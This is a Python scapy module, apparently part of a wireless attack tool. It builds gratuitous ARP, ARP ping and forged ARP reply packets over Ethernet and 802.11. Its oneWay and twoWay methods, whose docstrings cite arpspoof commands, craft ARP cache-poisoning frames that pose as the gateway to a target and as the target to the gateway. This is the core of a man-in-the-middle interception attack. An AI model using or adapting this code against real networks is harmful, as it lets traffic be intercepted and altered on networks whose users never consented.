from scapy.all import *

class Arps(object):
    """Handles ARP scenarios"""
    slots = ['sh']

    def __init__(self, shared):
        self.sh = shared


    def gratCast(self):
        """Gratuitous ARP updates
        arping -i wlan0 -U -S 192.168.100.226 192.168.100.226
        """
        if self.sh.bus == 'RadioTap':
            ADDR1, ADDR2, ADDR3 = self.sh.whichWay(bcast = 1)
            if self.sh.fcField == 1 or self.sh.fcField == 65:
                if self.sh.spare != 'tst':
                    return RadioTap()\
                           /Dot11(addr1 = ADDR1,
                                  addr2 = ADDR2,
                                  addr3 = ADDR3,
                                  FCfield = self.sh.fcField,
                                  subtype = 8,
                                  type = 2)\
                           /Dot11QoS()\
                           /LLC()\
                           /SNAP(code = 2054)\
                           /ARP(op = 1,
                                hwdst = 'ff:ff:ff:ff:ff:ff',
                                hwsrc = self.sh.macTx,
                                pdst = self.sh.ipSrc,
                                psrc = self.sh.ipSrc)
                else:
                    return RadioTap()\
                           /Dot11(addr1 = ADDR1,
                                  addr2 = ADDR2,
                                  addr3 = ADDR3,
                                  FCfield = self.sh.fcField,
                                  # subtype = 8,                                #https://github.com/secdev/scapy/issues/3793
                                  type = 2)\
                           /LLC()\
                           /SNAP(code = 2054)\
                           /ARP(op = 1,
                                hwdst = 'ff:ff:ff:ff:ff:ff',
                                hwsrc = self.sh.macTx,
                                pdst = self.sh.ipSrc,
                                psrc = self.sh.ipSrc)
            elif self.sh.fcField == 2 or self.sh.fcField == 66:
                return RadioTap()\
                       /Dot11(addr1 = ADDR1,
                              addr2 = ADDR2,
                              addr3 = ADDR3,
                              FCfield = self.sh.fcField,
                              subtype = 8,
                              type = 2)\
                       /Dot11QoS()\
                       /LLC()\
                       /SNAP(code = 2054)\
                       /ARP(op = 1,
                            hwdst = 'ff:ff:ff:ff:ff:ff',
                            hwsrc = self.sh.macTx,
                            pdst = self.sh.ipSrc,
                            psrc = self.sh.ipSrc)
        else:
            return Ether(dst = 'ff:ff:ff:ff:ff:ff',
                         src = self.sh.macTx,
                         type = 2054)\
                   /ARP(op = 1,
                        hwdst = 'ff:ff:ff:ff:ff:ff',
                        hwsrc = self.sh.macTx,
                        pdst = self.sh.ipSrc,
                        psrc = self.sh.ipSrc)


    def oneWay(self):
        """one-way ARP leveraging 'is-at'
        arpspoof -i wlan0 -t 192.168.100.226 192.168.100.1
        """
        if self.sh.bus == 'RadioTap':
            ADDR1, ADDR2, ADDR3 = self.sh.whichWay()
            return RadioTap()\
                   /Dot11(addr1 = ADDR1,
                          addr2 = ADDR2,
                          addr3 = ADDR3,
                          FCfield = self.sh.fcField,
                          subtype = 8,
                          type = 2)\
                   /Dot11QoS()\
                   /LLC()\
                   /SNAP(code = 2054)\
                   /ARP(op = 2,
                        hwdst = self.sh.macRx,
                        hwsrc = self.sh.macTx,
                        pdst = self.sh.ipDst,
                        psrc = self.sh.ipGtw)
        else:
            return Ether(dst = self.sh.macRx,
                         src = self.sh.macTx,
                         type = 2054)\
                   /ARP(op = 2,
                        hwdst = self.sh.macRx,
                        hwsrc = self.sh.macTx,
                        pdst = self.sh.ipDst,
                        psrc = self.sh.ipGtw)


    def ping(self):
        """Ping using ARP like nmap

        Interesting in that nmap and arpspoof seem to have a different outcome
        with respect to arp traffic and the associated layers in the frame.
        """
        if self.sh.bus == 'RadioTap':
            ADDR1, ADDR2, ADDR3 = self.sh.whichWay(bcast = 1)
            if self.sh.spare != 'tst':
                return RadioTap()\
                       /Dot11(addr1 = ADDR1,
                              addr2 = ADDR2,
                              addr3 = ADDR3,
                              FCfield = self.sh.fcField,
                              subtype = 8,
                              type = 2)\
                       /Dot11QoS()\
                       /LLC()\
                       /SNAP(code = 2054)\
                       /ARP(op = 1,
                            hwdst = '00:00:00:00:00:00',
                            hwsrc = self.sh.macTx,
                            pdst = self.sh.ipDst,
                            psrc = self.sh.ipSrc)
            else:
                return RadioTap()\
                       /Dot11(addr1 = ADDR1,
                              addr2 = ADDR2,
                              addr3 = ADDR3,
                              FCfield = self.sh.fcField,
                              # subtype = 8,                                    #https://github.com/secdev/scapy/issues/3793
                              type = 2)\
                       /LLC()\
                       /SNAP(code = 2054)\
                       /ARP(op = 1,
                            hwdst = '00:00:00:00:00:00',
                            hwsrc = self.sh.macTx,
                            pdst = self.sh.ipDst,
                            psrc = self.sh.ipSrc)
        else:
            return Ether(dst = 'ff:ff:ff:ff:ff:ff',
                         src = self.sh.macTx,
                         type = 2054)\
                   /ARP(op = 1,
                        hwdst = '00:00:00:00:00:00',
                        hwsrc = self.sh.macTx,
                        pdst = self.sh.ipDst,
                        psrc = self.sh.ipSrc)


    def twoWay(self):
        """two-way ARP leveraging to-ds
        arpspoof -i wlan0 -t 192.168.100.226 -r 192.168.100.1
        Returns [rtrArp, tgtArp]"""
        if self.sh.bus == 'RadioTap':

            ## For the tgtArp to also use to-ds
            self.sh.fcField = 1

            ADDR1, ADDR2, ADDR3 = self.sh.whichWay()
            p2 = RadioTap()\
                 /Dot11(addr1 = ADDR1,
                        addr2 = ADDR2,
                        addr3 = self.sh.macGw,
                        subtype = 8,
                        type = 2,
                        FCfield = self.sh.fcField)\
                 /Dot11QoS()\
                 /LLC()\
                 /SNAP(code = 2054)\
                 /ARP(op = 2,
                      hwdst = self.sh.macGw,
                      hwsrc = self.sh.macTx,
                      pdst = self.sh.ipGtw,
                      psrc = self.sh.ipDst)
        else:
            p2 = Ether(dst = self.sh.macGw,
                       src = self.sh.macTx,
                       type = 2054)\
                 /ARP(op = 2,
                      hwdst = self.sh.macGw,
                      hwsrc = self.sh.macTx,
                      pdst = self.sh.ipGtw,
                      psrc = self.sh.ipDst)
        return [p2, self.oneWay()]
